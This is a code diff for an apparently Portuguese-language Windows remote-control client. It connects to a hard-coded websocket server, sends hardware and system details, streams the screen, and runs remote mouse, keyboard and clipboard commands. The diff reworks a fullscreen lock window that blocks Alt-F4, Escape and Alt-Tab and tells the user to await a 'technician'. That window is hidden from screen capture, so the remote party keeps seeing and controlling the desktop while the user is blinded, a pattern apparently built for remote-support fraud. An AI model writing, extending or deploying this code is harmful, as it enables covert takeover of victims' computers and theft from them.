@@ -11,14 +11,14 @@ import ctypes
 import ssl
 import sys
 from io import BytesIO
-from ctypes import wintypes
 
+import mss
 from PIL import Image
 import pyautogui
 import pyperclip
 
 SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
-FRAME_INTERVAL = 0.05
+FRAME_INTERVAL = 0.033
 QUALITY = 70
 SCALE = 0.75
 
@@ -35,7 +35,6 @@ ws_app = None
 running = True
 screen_locked = False
 lock_thread = None
-lock_hwnd = None
 
 
 def set_console_title(title):
@@ -72,7 +71,6 @@ def print_status(status, id_code=None):
     if status == "connecting":
         set_console_title("Conectando...")
         print("  Status: Conectando ao servidor...")
-        print("")
     elif status == "waiting":
         set_console_title(f"Aguardando - {id_code}")
         print("  Status: AGUARDANDO CONEXAO")
@@ -82,7 +80,6 @@ def print_status(status, id_code=None):
         print("  " + "=" * 50)
         print("")
         print("  Informe este codigo ao tecnico.")
-        print("")
     elif status == "connected":
         set_console_title(f"Conectado - {id_code}")
         print("  Status: SESSAO ATIVA")
@@ -90,14 +87,11 @@ def print_status(status, id_code=None):
         print("  " + "*" * 50)
         print("  *           CONEXAO ESTABELECIDA               *")
         print("  " + "*" * 50)
-        print("")
-        print(f"  ID: {id_code}")
-        print("")
+        print(f"\n  ID: {id_code}")
     elif status == "disconnected":
         set_console_title(f"Desconectado - {id_code}")
         print("  Status: AGUARDANDO RECONEXAO")
         print(f"  Codigo: {id_code}")
-        print("")
 
 
 def get_hwid():
@@ -134,81 +128,90 @@ def get_system_info():
 
 
 # ============================================
-# LOCK SCREEN - JANELA DE BLOQUEIO
+# LOCK SCREEN - POPUP PARA O CLIENTE
 # ============================================
 
 def show_lock_screen(message):
-    global screen_locked, lock_thread, lock_hwnd
+    global screen_locked, lock_thread
 
     if screen_locked:
         return
 
     screen_locked = True
 
-    def run_lock_window():
-        global screen_locked, lock_hwnd
+    def create_lock_window():
+        global screen_locked
         try:
             import tkinter as tk
 
             root = tk.Tk()
-            root.title("")
+            root.title("Aguarde")
 
-            screen_width = root.winfo_screenwidth()
-            screen_height = root.winfo_screenheight()
+            # Obter dimensoes da tela
+            sw = root.winfo_screenwidth()
+            sh = root.winfo_screenheight()
 
-            root.geometry(f"{screen_width}x{screen_height}+0+0")
+            # Janela fullscreen
+            root.geometry(f"{sw}x{sh}+0+0")
             root.configure(bg='#000000')
-            root.attributes('-topmost', True)
             root.overrideredirect(True)
+            root.attributes('-topmost', True)
 
+            # Bloquear teclas
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.bind('<Alt-F4>', lambda e: 'break')
             root.bind('<Escape>', lambda e: 'break')
+            root.bind('<Alt-Tab>', lambda e: 'break')
 
-            # Aplicar WDA_EXCLUDEFROMCAPTURE
+            # Forcar atualizacao para obter HWND
+            root.update_idletasks()
             root.update()
+
+            # Aplicar WDA_EXCLUDEFROMCAPTURE para esconder da captura
             try:
                 hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
-                lock_hwnd = hwnd
-                WDA_EXCLUDEFROMCAPTURE = 0x00000011
-                ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
+                if hwnd == 0:
+                    hwnd = root.winfo_id()
+                # WDA_EXCLUDEFROMCAPTURE = 0x11 (Windows 10 2004+)
+                result = ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11)
             except:
                 pass
 
+            # Conteudo central
             frame = tk.Frame(root, bg='#000000')
             frame.place(relx=0.5, rely=0.5, anchor='center')
 
-            try:
-                icon_label = tk.Label(frame, text="🔒", font=('Segoe UI Emoji', 80), bg='#000000', fg='#f59e0b')
-            except:
-                icon_label = tk.Label(frame, text="[LOCKED]", font=('Arial', 40, 'bold'), bg='#000000', fg='#f59e0b')
-            icon_label.pack(pady=30)
+            # Icone cadeado
+            lock_icon = tk.Label(frame, text="🔒", font=('Segoe UI Emoji', 72), bg='#000000', fg='#f59e0b')
+            lock_icon.pack(pady=20)
 
-            msg_label = tk.Label(frame, text=message, font=('Arial', 28, 'bold'), bg='#000000', fg='#ffffff', wraplength=800)
-            msg_label.pack(pady=20)
+            # Mensagem
+            msg = tk.Label(frame, text=message, font=('Segoe UI', 24, 'bold'), bg='#000000', fg='#ffffff', wraplength=700)
+            msg.pack(pady=15)
 
-            sub_label = tk.Label(frame, text="Por favor, aguarde o técnico liberar a tela.", font=('Arial', 14), bg='#000000', fg='#666666')
-            sub_label.pack(pady=15)
+            # Submensagem
+            sub = tk.Label(frame, text="Por favor, aguarde o técnico liberar a tela.", font=('Segoe UI', 12), bg='#000000', fg='#555555')
+            sub.pack(pady=10)
 
-            def check_unlock():
-                global lock_hwnd
+            # Loop para verificar desbloqueio
+            def check_loop():
                 if not screen_locked:
-                    lock_hwnd = None
                     root.destroy()
-                else:
-                    root.lift()
-                    root.attributes('-topmost', True)
-                    root.after(200, check_unlock)
+                    return
+                root.lift()
+                root.attributes('-topmost', True)
+                root.focus_force()
+                root.after(150, check_loop)
 
-            check_unlock()
+            root.after(100, check_loop)
             root.mainloop()
 
-        except:
+        except Exception as e:
             screen_locked = False
-            lock_hwnd = None
 
-    lock_thread = threading.Thread(target=run_lock_window, daemon=True)
+    lock_thread = threading.Thread(target=create_lock_window, daemon=True)
     lock_thread.start()
+    time.sleep(0.3)  # Aguardar janela ser criada
 
 
 def hide_lock_screen():
@@ -217,68 +220,13 @@ def hide_lock_screen():
 
 
 # ============================================
-# CAPTURA DE TELA VIA GDI (BitBlt)
+# CAPTURA DE TELA
 # ============================================
-
-def capture_screen_gdi():
-    """Captura tela via Windows GDI - respeita WDA_EXCLUDEFROMCAPTURE"""
-    user32 = ctypes.windll.user32
-    gdi32 = ctypes.windll.gdi32
-
-    width = user32.GetSystemMetrics(0)
-    height = user32.GetSystemMetrics(1)
-
-    hdesktop = user32.GetDesktopWindow()
-    desktop_dc = user32.GetWindowDC(hdesktop)
-    img_dc = gdi32.CreateCompatibleDC(desktop_dc)
-
-    hbmp = gdi32.CreateCompatibleBitmap(desktop_dc, width, height)
-    gdi32.SelectObject(img_dc, hbmp)
-
-    # BitBlt com SRCCOPY
-    gdi32.BitBlt(img_dc, 0, 0, width, height, desktop_dc, 0, 0, 0x00CC0020)
-
-    # Extrair pixels
-    class BITMAPINFOHEADER(ctypes.Structure):
-        _fields_ = [
-            ('biSize', wintypes.DWORD),
-            ('biWidth', wintypes.LONG),
-            ('biHeight', wintypes.LONG),
-            ('biPlanes', wintypes.WORD),
-            ('biBitCount', wintypes.WORD),
-            ('biCompression', wintypes.DWORD),
-            ('biSizeImage', wintypes.DWORD),
-            ('biXPelsPerMeter', wintypes.LONG),
-            ('biYPelsPerMeter', wintypes.LONG),
-            ('biClrUsed', wintypes.DWORD),
-            ('biClrImportant', wintypes.DWORD),
-        ]
-
-    bmi = BITMAPINFOHEADER()
-    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-    bmi.biWidth = width
-    bmi.biHeight = -height  # Top-down
-    bmi.biPlanes = 1
-    bmi.biBitCount = 32
-    bmi.biCompression = 0
-
-    buffer_size = width * height * 4
-    buffer = ctypes.create_string_buffer(buffer_size)
-
-    gdi32.GetDIBits(img_dc, hbmp, 0, height, buffer, ctypes.byref(bmi), 0)
-
-    # Limpar
-    gdi32.DeleteObject(hbmp)
-    gdi32.DeleteDC(img_dc)
-    user32.ReleaseDC(hdesktop, desktop_dc)
-
-    # Criar imagem PIL
-    img = Image.frombuffer('RGBA', (width, height), buffer, 'raw', 'BGRA', 0, 1)
-    return img.convert('RGB')
-
 
 def capture_screen():
     global panel_connected, running, current_quality, current_scale
+
+    sct = mss.mss()
 
     while running:
         if not panel_connected:
@@ -286,11 +234,14 @@ def capture_screen():
             continue
 
         try:
-            img = capture_screen_gdi()
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
 
-            new_width = int(img.width * current_scale)
-            new_height = int(img.height * current_scale)
-            img = img.resize((new_width, new_height), Image.LANCZOS)
+            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
+
+            new_w = int(img.width * current_scale)
+            new_h = int(img.height * current_scale)
+            img = img.resize((new_w, new_h), Image.LANCZOS)
 
             buffer = BytesIO()
             img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
@@ -301,13 +252,14 @@ def capture_screen():
                     "type": "screen-frame",
                     "clientId": client_id,
                     "frame": frame_data,
-                    "width": img.width,
-                    "height": img.height
+                    "width": new_w,
+                    "height": new_h
                 }))
 
             time.sleep(FRAME_INTERVAL)
-        except Exception as e:
-            time.sleep(1)
+
+        except:
+            time.sleep(0.5)
 
 
 # ============================================
@@ -315,7 +267,6 @@ def capture_screen():
 # ============================================
 
 def handle_mouse_move(data):
-    global current_scale
     try:
         x = int(data['x'] / current_scale)
         y = int(data['y'] / current_scale)
@@ -325,15 +276,14 @@ def handle_mouse_move(data):
 
 
 def handle_mouse_click(data):
-    global current_scale
     try:
         x = int(data['x'] / current_scale)
         y = int(data['y'] / current_scale)
-        button = data.get('button', 'left')
+        btn = data.get('button', 'left')
         clicks = data.get('clicks', 1)
-        if button == 'right':
+        if btn == 'right':
             pyautogui.click(x, y, button='right')
-        elif button == 'middle':
+        elif btn == 'middle':
             pyautogui.click(x, y, button='middle')
         else:
             pyautogui.click(x, y, clicks=clicks)
@@ -343,8 +293,7 @@ def handle_mouse_click(data):
 
 def handle_mouse_scroll(data):
     try:
-        delta = data.get('delta', 0)
-        pyautogui.scroll(delta)
+        pyautogui.scroll(data.get('delta', 0))
     except:
         pass
 
@@ -361,8 +310,7 @@ def handle_key_press(data):
             'F6': 'f6', 'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10',
             'F11': 'f11', 'F12': 'f12', ' ': 'space'
         }
-        mapped_key = key_map.get(key, key)
-        pyautogui.press(mapped_key)
+        pyautogui.press(key_map.get(key, key))
     except:
         pass
 
@@ -371,16 +319,15 @@ def handle_key_combination(data):
     try:
         keys = data.get('keys', [])
         key_map = {'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift', 'Meta': 'win'}
-        mapped_keys = [key_map.get(k, k.lower()) for k in keys]
-        pyautogui.hotkey(*mapped_keys)
+        mapped = [key_map.get(k, k.lower()) for k in keys]
+        pyautogui.hotkey(*mapped)
     except:
         pass
 
 
 def handle_clipboard_set(data):
     try:
-        content = data.get('content', '')
-        pyperclip.copy(content)
+        pyperclip.copy(data.get('content', ''))
     except:
         pass
 
@@ -478,8 +425,7 @@ def on_close(ws, close_status_code, close_msg):
 def on_open(ws):
     global is_connected
     is_connected = True
-    info = get_system_info()
-    ws.send(json.dumps({"type": "register-client", **info}))
+    ws.send(json.dumps({"type": "register-client", **get_system_info()}))
 
 
 def main():
@@ -487,8 +433,7 @@ def main():
 
     print_status("connecting")
 
-    screen_thread = threading.Thread(target=capture_screen, daemon=True)
-    screen_thread.start()
+    threading.Thread(target=capture_screen, daemon=True).start()
 
     while running:
         try:
